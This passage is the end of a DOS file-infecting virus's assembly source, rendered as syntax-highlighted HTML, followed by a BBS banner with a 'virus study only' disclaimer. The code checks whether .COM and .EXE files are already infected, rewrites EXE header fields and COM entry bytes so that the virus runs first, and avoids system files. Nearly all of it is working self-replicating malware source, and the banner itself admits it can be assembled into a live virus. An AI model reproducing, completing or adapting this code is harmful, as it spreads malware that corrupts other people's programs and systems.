              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                             </span><span class="sc1">; .COM file - Write 'EB 02'</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EB02</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                            </span><span class="sc1">; Write program-size in pars</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProgSize</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; Write rest of begin of virus</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">104h</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Exe_header</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                                         </span><span class="sc1">; Write in File</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_buf</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Proc: Change file pointer ***</span><span class="sc0">

</span><span class="sc5">Cng_file_ptr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Proc: Go to begin of file ***</span><span class="sc0">

</span><span class="sc5">Go_file_beg</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                                        </span><span class="sc1">; Filepointer = 0</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Cng_file_ptr</span><span class="sc0">                            </span><span class="sc1">; Change File Pointer</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0"> 


</span><span class="sc1">;*** Proc: Check file is already infected ***</span><span class="sc0">

</span><span class="sc5">Check_infect</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">104h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Com_or_exe</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; Flag for .COM</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc2">5A4Dh</span><span class="sc0">                              </span><span class="sc1">; Is .EXE?</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Is_Exe</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">                                         </span><span class="sc1">; No, .COM file</span><span class="sc0">
              </span><span class="sc6">cld</span><span class="sc0">
              </span><span class="sc6">repz</span><span class="sc0">                                           </span><span class="sc1">; Already infected?</span><span class="sc0">
              </span><span class="sc6">cmpsb</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Do_Infect</span><span class="sc0">                                            </span><span class="sc1">; Not yet</span><span class="sc0">
</span><span class="sc5">Dont_Infect</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stc</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Do_Infect</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">clc</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Is_Exe</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Com_or_exe</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; Flag for .EXE</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">; cx = Prog-IP</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBegin</span><span class="sc0">                           </span><span class="sc1">; Same as Vir-IP?</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Dont_Infect</span><span class="sc0">                                         </span><span class="sc1">; Yes, quit</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Max extra pars=0?</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Dont_Infect</span><span class="sc0">                                         </span><span class="sc1">; Yes, quit</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Exe_ip</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                                     </span><span class="sc1">; Save prog-IP</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Exe_cs</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                                     </span><span class="sc1">; Save prog-cs</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">R_ss</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                                       </span><span class="sc1">; Save prog-SS</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">R_sp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">                                       </span><span class="sc1">; Save prog-SP</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Do_Infect</span><span class="sc0">


</span><span class="sc1">;*** Proc: Calculate data for infection ***</span><span class="sc0">

</span><span class="sc5">Calc_data</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                                           </span><span class="sc1">; Go to EOF</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">         </span><span class="sc1">; Size mod 16 = 0 (File is exact x paragraps)?</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">No_par_add</span><span class="sc0">                            </span><span class="sc1">; Yes, no extra par added</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                                         </span><span class="sc1">; Add paragraph</span><span class="sc0">
              </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">; Overflow -&gt; Inc dx</span><span class="sc0">
              </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFF0h</span><span class="sc0">                                    </span><span class="sc1">; Make paragraphs</span><span class="sc0">
</span><span class="sc5">No_par_add</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Com_or_exe</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Calc_exe</span><span class="sc0">
              </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_infect</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">maxcomsize</span><span class="sc4">]</span><span class="sc0">                                </span><span class="sc1">; File too big?</span><span class="sc0">
              </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">not_infect</span><span class="sc0">                                          </span><span class="sc1">; Yes, quit</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">VirSize</span><span class="sc4">]</span><span class="sc0">                                 </span><span class="sc1">; File too small?</span><span class="sc0">
              </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">Not_Infect</span><span class="sc0">                                         </span><span class="sc1">; Yes, quit</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgSize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; Save program-size</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
              </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ProgSize</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">                         </span><span class="sc1">; In paragraphs</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Cng_file_ptr</span><span class="sc0">                                      </span><span class="sc1">; Go to EOF</span><span class="sc0">
              </span><span class="sc6">clc</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Not_Infect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stc</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Calc_exe</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                                      </span><span class="sc1">; 100 bytes stack</span><span class="sc0">
              </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                       </span><span class="sc1">; Overflow - inc dx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Cng_file_ptr</span><span class="sc0">                                      </span><span class="sc1">; Go to EOF</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">VirSize</span><span class="sc4">]</span><span class="sc0">                                  </span><span class="sc1">; New exe-length</span><span class="sc0">
              </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                                    </span><span class="sc1">; For header: / 512</span><span class="sc0">
              </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">No_Correct</span><span class="sc0">
              </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Files below 2.000.000h bytes - length correction</span><span class="sc0">
</span><span class="sc5">No_Correct</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">; Save new file-length</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; '  ' ' ' '  ' '    '</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Calc_cs_ss</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">                    </span><span class="sc1">; Prog-SP=100h</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBegin</span><span class="sc0">          </span><span class="sc1">; Set prog-IP</span><span class="sc0">
              </span><span class="sc6">clc</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Proc: Calculate new CS and SS for .EXE file ***</span><span class="sc0">

</span><span class="sc5">Calc_cs_ss</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Cs_ss_lp</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
              </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
              </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Cs_ss_lp</span><span class="sc0">
              </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                               </span><span class="sc1">; Size of header</span><span class="sc0">
              </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; Save prog-SS</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Head_buf</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">; Save prog-cs</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Check infection is possible ***</span><span class="sc0">

</span><span class="sc5">Chk_Inf</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Chk_exec</span><span class="sc0">                           </span><span class="sc1">; Check file is executable</span><span class="sc0">
              </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Not_exec</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_attr</span><span class="sc0">                         </span><span class="sc1">; Check file has no SYS attr</span><span class="sc0">
</span><span class="sc5">Not_Exec</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*** Search-paths ***</span><span class="sc0">

</span><span class="sc5">Com_path</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Exe_path</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;*** Check file is executable (.COM / .EXE)</span><span class="sc0">

</span><span class="sc5">Chk_Exec</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">R_ds</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
              </span><span class="sc6">cld</span><span class="sc0">
              </span><span class="sc6">repnz</span><span class="sc0">                                                 </span><span class="sc1">; Search '.'</span><span class="sc0">
              </span><span class="sc6">scasb</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_inf</span><span class="sc0">                                         </span><span class="sc1">; No '.' found</span><span class="sc0">
              </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Com_path</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
              </span><span class="sc6">std</span><span class="sc0">
              </span><span class="sc6">repz</span><span class="sc0">                                                </span><span class="sc1">; Check '.COM'</span><span class="sc0">
              </span><span class="sc6">cmpsb</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_com</span><span class="sc0">                                               </span><span class="sc1">; No .COM</span><span class="sc0">
              </span><span class="sc6">clc</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">
              </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">Not_Inf</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">stc</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">cld</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">No_Com</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Exe_path</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
              </span><span class="sc6">repz</span><span class="sc0">                                                </span><span class="sc1">; Check '.EXE'</span><span class="sc0">
              </span><span class="sc6">cmpsb</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_inf</span><span class="sc0">                      </span><span class="sc1">; No .EXE either - not executable</span><span class="sc0">
              </span><span class="sc6">clc</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">

</span><span class="sc5">Get_Attr</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                                        </span><span class="sc1">; Get FileAttr</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">R_ds</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Bad_Attr</span><span class="sc0">                                 </span><span class="sc1">; Error - don't infect</span><span class="sc0">
              </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                                           </span><span class="sc1">; System-Attr?</span><span class="sc0">
              </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Bad_Attr</span><span class="sc0">                                   </span><span class="sc1">; Yes, don't infect</span><span class="sc0">
              </span><span class="sc6">clc</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Bad_Attr</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">stc</span><span class="sc0">
              </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">First_bytes</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">     </span><span class="sc1">; First bytes of orig. program - here just 'Go to DOS'</span><span class="sc0">
              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                                   </span><span class="sc1">; Overwrites the begin</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc2">102h</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBegin</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=] For All Your H/P/A/V Files [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]    SysOp: Peter Venkman    [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;</span><span class="sc0">
</span><span class="sc1">; Around Among the General Public. It Will be Very Useful for Learning how   ;</span><span class="sc0">
</span><span class="sc1">; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;</span><span class="sc0">
</span><span class="sc1">; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;</span><span class="sc0">
</span><span class="sc1">; Experience can Turn it Into a far More Malevolent Program Than it Already  ;</span><span class="sc0">
</span><span class="sc1">; Is. Keep This Code in Responsible Hands!                                   ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
